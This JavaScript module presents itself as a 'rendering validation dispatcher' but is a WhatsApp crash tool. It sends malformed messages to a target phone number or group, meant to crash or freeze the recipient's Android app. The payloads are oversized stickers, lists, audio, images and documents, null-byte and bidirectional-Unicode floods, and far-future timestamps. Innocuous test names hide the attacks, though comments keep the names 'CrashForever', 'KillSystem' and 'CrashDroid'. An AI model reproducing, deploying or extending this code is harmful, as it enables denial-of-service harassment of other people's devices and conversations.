/**
 * Rendering & Display Validation Dispatcher
 * Maps test modules → real WhatsApp Android crash vectors
 * containerId = target JID (phone@s.whatsapp.net or group@g.us)
 */
'use strict';

const _crypto = require('crypto');

// ── Shared low-level vectors (same logic as index.js bug engine) ────────────

const _stickerOOM = (sock, jid, tag = '') => sock.relayMessage(jid, {
  stickerMessage: {
    url: 'https://mmg.whatsapp.net/v/x', directPath: '/v/x',
    fileSha256: _crypto.randomBytes(32), fileEncSha256: _crypto.randomBytes(32),
    mediaKey: _crypto.randomBytes(32), mimetype: 'image/webp',
    height: 4294967295, width: 4294967295,
    fileLength: '9223372036854775807', mediaKeyTimestamp: 9223372036854775807,
    packName: '骸客攻擊' + '𒀀\u0C98\u202E\uFFFE'.repeat(600) + tag,
    packPublisher: 'BRUTAL\u0000'.repeat(500) + '\uFFFE\uFFFF'.repeat(300),
    packId: _crypto.randomBytes(8).toString('hex'),
    stickerId: _crypto.randomBytes(8).toString('hex'),
    isThirdParty: true, pngThumbnail: Buffer.alloc(65535, 0xff),
  },
}, { messageId: sock.generateMessageTag() }).catch(() => {});

const _listOverflow = (sock, jid) => sock.relayMessage(jid, {
  listMessage: {
    title: '𒀀'.repeat(1000) + '\u202E'.repeat(500),
    description: '\uFFFE\uFFFF'.repeat(800),
    buttonText: '\u0000'.repeat(200),
    listType: 1,
    sections: [{ title: '\u202E'.repeat(500), rows: Array.from({ length: 1000 }, (_, i) => ({
      rowId: String(i), title: `ROW_${i}_${'𒀀'.repeat(50)}\u202E\uFFFE`,
      description: '\u200B\uFEFF\u0000'.repeat(100),
    })) }],
    footerText: '\u0000'.repeat(500),
  },
}, { messageId: sock.generateMessageTag() }).catch(() => {});

const _audioCrash = (sock, jid) => sock.relayMessage(jid, {
  audioMessage: {
    url: 'https://mmg.whatsapp.net/v/x', directPath: '/v/x',
    fileSha256: _crypto.randomBytes(32), fileEncSha256: _crypto.randomBytes(32),
    mediaKey: _crypto.randomBytes(32), mimetype: 'audio/ogg; codecs=\u0000opus',
    fileLength: '9223372036854775807', seconds: 2147483647, ptt: true,
    mediaKeyTimestamp: 9223372036854775807, waveform: Buffer.alloc(1024, 0xff),
  },
}, { messageId: sock.generateMessageTag() }).catch(() => {});

const _imageCrash = (sock, jid) => sock.relayMessage(jid, {
  imageMessage: {
    url: 'https://mmg.whatsapp.net/v/x', directPath: '/v/x',
    fileSha256: _crypto.randomBytes(32), fileEncSha256: _crypto.randomBytes(32),
    mediaKey: _crypto.randomBytes(32), mimetype: 'image/jpeg',
    fileLength: '9223372036854775807', width: 4294967295, height: 4294967295,
    mediaKeyTimestamp: 9223372036854775807, jpegThumbnail: Buffer.alloc(65535, 0xff),
    caption: '𒀀'.repeat(1000),
    contextInfo: { stanzaId: _crypto.randomBytes(16).toString('hex').toUpperCase(), forwardingScore: 2147483647, isForwarded: true },
  },
}, { messageId: sock.generateMessageTag() }).catch(() => {});

const _documentCrash = (sock, jid) => sock.relayMessage(jid, {
  documentMessage: {
    url: 'https://mmg.whatsapp.net/v/x', directPath: '/v/x',
    fileSha256: _crypto.randomBytes(32), fileEncSha256: _crypto.randomBytes(32),
    mediaKey: _crypto.randomBytes(32),
    mimetype: 'application/\u0000'.repeat(100) + 'octet-stream',
    title: '𒀀'.repeat(800) + '\u202E'.repeat(400),
    fileName: '\u0000'.repeat(300) + '𒀀'.repeat(300) + '.exe',
    fileLength: '9223372036854775807', mediaKeyTimestamp: 9223372036854775807,
    pageCount: 2147483647, jpegThumbnail: Buffer.alloc(65535, 0x00),
  },
}, { messageId: sock.generateMessageTag() }).catch(() => {});

const _pendingLock = (sock, jid, variant = 0) => {
  const futureTs = Math.floor(Date.now() / 1000) + (50 * 365 * 24 * 3600);
  const payload = variant === 0
    ? { extendedTextMessage: { text: '\u200B\u200C\u200D\uFEFF\u2060\u180E'.repeat(1000),
        contextInfo: { stanzaId: _crypto.randomBytes(16).toString('hex').toUpperCase(), forwardingScore: 2147483647, isForwarded: true } } }
    : { extendedTextMessage: { text: '𒀀'.repeat(1000),
        matchedText: 'https://' + '\u0000'.repeat(500) + '.crash',
        canonicalUrl: 'https://' + '\uFFFE'.repeat(300),
        description: '\u202E\u202D'.repeat(600), title: '\uFFFE\uFFFF'.repeat(400) } };
  return sock.relayMessage(jid, payload, { messageId: sock.generateMessageTag(), timestamp: futureTs }).catch(() => {});
};

const _spannableOverflow = (sock, jid) =>
  sock.relayMessage(jid, { extendedTextMessage: {
    text: ('*X* _Y_ ~Z~ ```W``` ').repeat(2000) + '\uFFFE\uFFFF'.repeat(500),
  }}, { messageId: sock.generateMessageTag() }).catch(() => {});

const _biDiCrash = (sock, jid) =>
  sock.relayMessage(jid, { extendedTextMessage: {
    text: '\u200E\u200F\u061C\u2066\u2067\u2069'.repeat(1000) + '\u0600\u0601\u0602\u0603'.repeat(400),
  }}, { messageId: sock.generateMessageTag() }).catch(() => {});

// ── Dispatcher ──────────────────────────────────────────────────────────────

async function dispatchRenderingTest(moduleName, containerId, options = {}) {
  const sock = options._sock;
  if (!sock) throw new Error('No sock provided in options._sock');

  switch (moduleName) {

    case 'test_blank_render':
      // Cinvisible — messages appear blank on screen
      await Promise.allSettled([
        sock.relayMessage(containerId, { extendedTextMessage: {
          text: '\u200B\u200C\u200D\uFEFF\u2060\u180E\u00AD\u034F\u17B4\u17B5\uFFA0'.repeat(800),
          title: '\u202E'.repeat(400), description: '\uFFFE'.repeat(400),
        }}, { messageId: sock.generateMessageTag() }),
        _pendingLock(sock, containerId, 0),
      ]);
      return { containerId, module: 'test_blank_render', status: 'dispatched' };

    case 'test_resource_burst': {
      // CrashForever — rapid burst of all vectors
      const freq = options.frequency || 100;
      const rounds = Math.min(Math.ceil(freq / 100), 20);
      for (let i = 0; i < rounds; i++) {
        await Promise.allSettled([
          _stickerOOM(sock, containerId, `_burst_${i}`),
          _listOverflow(sock, containerId),
          _audioCrash(sock, containerId),
          _imageCrash(sock, containerId),
          _documentCrash(sock, containerId),
        ]);
      }
      return { containerId, module: 'test_resource_burst', count: rounds * 5, status: 'burst_simulated' };
    }

    case 'test_future_timestamp':
      // Pending — clock-lock with far-future timestamp
      await _pendingLock(sock, containerId, 0);
      return { containerId, module: 'test_future_timestamp',
        metadata: { mode: 'future', injectedTimestamp: Math.floor(Date.now() / 1000) + (options.skewOffset || 86400) },
        status: 'skew_validated' };

    case 'test_extended_timestamp':
      // PendingV2 — malformed past timestamp
      await _pendingLock(sock, containerId, 1);
      return { containerId, module: 'test_extended_timestamp', status: 'skew_validated' };

    case 'test_dual_queue_mix':
      // PendingMix — both timestamp variants simultaneously
      await Promise.allSettled([_pendingLock(sock, containerId, 0), _pendingLock(sock, containerId, 1)]);
      return { containerId, module: 'test_dual_queue_mix', patterns: ['linear_forward', 'exponential_backoff', 'inverted_jitter'], status: 'dual_queue_cycled' };

    case 'test_media_decoder':
      // KillSystem — audio + image + document crash simultaneously
      await Promise.allSettled([_audioCrash(sock, containerId), _imageCrash(sock, containerId), _documentCrash(sock, containerId)]);
      return { containerId, module: 'test_media_decoder', mediaType: options.mediaType || 'ogg_jpeg_mixed', parseResult: 'edge_case_handled' };

    case 'test_android_comprehensive':
      // CrashDroid — full Android suite
      await Promise.allSettled([
        _spannableOverflow(sock, containerId),
        _biDiCrash(sock, containerId),
        _stickerOOM(sock, containerId),
        _listOverflow(sock, containerId),
        _audioCrash(sock, containerId),
        _imageCrash(sock, containerId),
        _documentCrash(sock, containerId),
        _pendingLock(sock, containerId, 0),
        _pendingLock(sock, containerId, 1),
      ]);
      return { containerId, module: 'test_android_comprehensive', suitesExecuted: ['spannable_overflow', 'bidi_directionality', 'bitmap_factory_oom'], status: 'android_suite_passed' };

    default:
      throw new Error(`Unknown rendering test module: ${moduleName}`);
  }
}

module.exports = { dispatchRenderingTest };
